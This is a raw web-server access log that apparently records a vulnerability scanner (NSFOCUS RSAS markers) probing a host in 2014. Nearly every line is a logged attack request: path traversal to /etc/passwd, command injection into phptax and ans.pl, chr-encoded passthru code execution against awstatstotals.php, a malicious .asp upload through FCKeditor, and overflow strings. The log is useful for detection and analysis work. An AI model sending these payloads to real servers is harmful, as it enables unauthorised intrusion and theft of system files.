192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /cgi-bin/Documentation.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /cgi-bin/doc/html/index.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /scripts/Documentation.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /scripts/doc/html/index.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /Documentation.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /doc/html/index.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /?Mode=debug HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /index.cfm?Mode=debug HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /index.cfml?Mode=debug HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /home.cfm?Mode=debug HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /home.cfml?Mode=debug HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /default.cfml?Mode=debug HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /default.cfm?Mode=debug HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /cgi-bin/?Mode=debug HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:27 +0800] "GET /scripts/?Mode=debug HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:28 +0800] "GET /admin/contextAdmin/contextAdmin.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:28 +0800] "PROPFIND / HTTP/1.0" 200 51
192.168.202.1 - - [19/Jul/2014:03:27:28 +0800] "POST /rtrlet/rtr HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:28 +0800] "GET /gettext.php?file=../../../../../../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:28 +0800] "GET /gettext.php?file=../../../../../../../../../../../windows/win.ini HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:28 +0800] "GET /webpagetest/gettext.php?file=../../../../../../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:28 +0800] "GET /webpagetest/gettext.php?file=../../../../../../../../../../../windows/win.ini HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:28 +0800] "GET /webpagetest/www/gettext.php?file=../../../../../../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:28 +0800] "GET /webpagetest/www/gettext.php?file=../../../../../../../../../../../windows/win.ini HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:28 +0800] "GET /soap/servlet/soaprouter HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:28 +0800] "GET /fcs/ident HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:29 +0800] "GET /phptax/drawimage.php?pfilez=xxx;%20touch%20nsfocusa6b550;&pdf=make HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:29 +0800] "GET /phptax/nsfocusa6b550 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:29 +0800] "GET /zabbix/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:29 +0800] "GET /phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=./ HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:27:29 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:27:29 +0800] "POST /rtrlet/rtr HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:29 +0800] "GET /cgi-bin/kvm.cgi?&file=login HTTP/1.1" 200 97
127.0.0.1 - - [19/Jul/2014:03:27:29 +0800] "GET /ajp_detect.py HTTP/1.0" 400 -
192.168.202.1 - - [19/Jul/2014:03:27:29 +0800] "GET /RsasTest2144270782.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:29 +0800] "GET /admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:29 +0800] "GET /images/RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:29 +0800] "GET /nuke/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:29 +0800] "GET /images/RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /demo/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /images/RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /phpnuke/html/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /images/RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /php_nuke/html/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /images/RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /php/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /images/RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /phpnew/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /images/RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /nuke50/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /images/RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /cgi-bin/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /images/RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /scripts/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /images/RSAS.txt HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET / HTTP/1.0" 200 51
192.168.202.1 - - [19/Jul/2014:03:27:30 +0800] "GET /DVR.cfg HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:32 +0800] "GET /phptax/drawimage.php?pfilez=xxx;%20rm%20nsfocusa6b550;&pdf=make HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:32 +0800] "GET /phptax/nsfocusa6b550 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:34 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:27:34 +0800] "GET /stronghold-info HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:34 +0800] "GET /stronghold-status HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:34 +0800] "GET /cgi-bin/mrtg.cgi?cfg=../../../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:35 +0800] "GET /scripts/mrtg.cgi?cfg=../../../../../../../../etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:35 +0800] "GET /cgi-bin/hsx.cgi?show=../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:35 +0800] "GET /phpinfo.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:35 +0800] "GET /cgi-bin/phpinfo.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:35 +0800] "GET /scripts/hsx.cgi?show=../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:35 +0800] "GET /imc/login.jsf HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:35 +0800] "GET / HTTP/1.0" 200 51
192.168.202.1 - - [19/Jul/2014:03:27:35 +0800] "GET /kimai/index.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:35 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:27:35 +0800] "GET /index.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:38 +0800] "GET /nosuchfile-10303-10310.php3 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /havalite/tmp/files/abcdef1234.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "POST /hpmpa/jobAcct/Default.asp?userId=06&jobId=60 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /perl/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET / HTTP/1.0" 200 51
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /userRpmNatDebugRpm26525557/linux_cmdline.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/apexec.pl?etype=odp&template=../../../../../../../../../etc/passwd%00.html&passurl=/category/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/apexec.pl?etype=odp&template=../../../../../../../../../etc/passwd%00.html&passurl=/category/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /server-info HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/swc?ctr=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/swc?ctr=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/ash HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/bash HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/csh HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/ksh HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/sh HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/tcsh HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /%00/ HTTP/1.1" 400 -
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/zsh HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /cgi-bin/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/ash HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /manager/html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/bash HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/csh HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/ksh HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/sh HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/tcsh HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/zsh HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /scripts/nonexist HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "POST /shoutbox/shoutbox.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /irpt/i/serverlogAction.do?input=def&cfrom=# HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "POST /fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "POST /fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:39 +0800] "GET /userfiles/file/8g3L7avk(1).asp HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /ROADS/cgi-bin/search.pl?form=../../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /index.php HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /cgi-bin/search.pl?form=../../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /scripts/search.pl?form=../../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /cgi-bin/awstatstotals.php?sort=%7b%24%7bpassthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /cgi-bin/awstatstotals.php?sort=%7b%24%7bpassthru(chr(100).chr(105).chr(114).chr(32).chr(47).chr(65).chr(58).chr(72).chr(32).chr(99).chr(58))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /awstatstotals.php?sort=%7b%24%7bpassthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /awstatstotals.php?sort=%7b%24%7bpassthru(chr(100).chr(105).chr(114).chr(32).chr(47).chr(65).chr(58).chr(72).chr(32).chr(99).chr(58))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /pages/awstatstotals.php?sort=%7b%24%7bpassthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /pages/awstatstotals.php?sort=%7b%24%7bpassthru(chr(100).chr(105).chr(114).chr(32).chr(47).chr(65).chr(58).chr(72).chr(32).chr(99).chr(58))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /apache2-default/awstatstotals.php?sort=%7b%24%7bpassthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /apache2-default/awstatstotals.php?sort=%7b%24%7bpassthru(chr(100).chr(105).chr(114).chr(32).chr(47).chr(65).chr(58).chr(72).chr(32).chr(99).chr(58))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /stat/awstatstotals.php?sort=%7b%24%7bpassthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /stat/awstatstotals.php?sort=%7b%24%7bpassthru(chr(100).chr(105).chr(114).chr(32).chr(47).chr(65).chr(58).chr(72).chr(32).chr(99).chr(58))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /awstatstotals/awstatstotals.php?sort=%7b%24%7bpassthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /awstatstotals/awstatstotals.php?sort=%7b%24%7bpassthru(chr(100).chr(105).chr(114).chr(32).chr(47).chr(65).chr(58).chr(72).chr(32).chr(99).chr(58))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /cgi-bin/php.cgi?/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /scripts/php.cgi?/etc/passwd HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:40 +0800] "GET /reports/rwservlet/showmap HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:41 +0800] "GET /index.php/module/action/param1/${@print(base64_decode(SSBsb3ZlIGppbmdqaW5n))} HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:41 +0800] "GET /phpadmin/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:41 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /phpmyadmin/ HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /examples/servlet/TroubleShooter HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /SiteScope/services/APISiteScopeImpl HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "POST /SiteScope/services/APIPreferenceImpl HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /story.pl?next=../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /story.pl?next=about HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /story/story.pl?next=../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /story/story.pl?next=about HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /cgi-bin/story.pl?next=../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /cgi-bin/story.pl?next=about HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /cgi-bin/story/story.pl?next=../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /%3f.jsp HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /cgi-bin/story/story.pl?next=about HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /scripts/story.pl?next=../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /scripts/story.pl?next=about HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /scripts/story/story.pl?next=../../../../../etc/passwd%00 HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /scripts/story/story.pl?next=about HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:42 +0800] "GET /index.php HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:27:43 +0800] "GET /ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:43 +0800] "GET /ans/ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:43 +0800] "GET /cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:43 +0800] "GET /cgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:43 +0800] "GET /scripts/ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:43 +0800] "GET /scripts/ans/ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:28:17 +0800] "GET /cgi-bin/htsearch?exclude=%60/etc/passwd%60 HTTP/1.1" 200 97
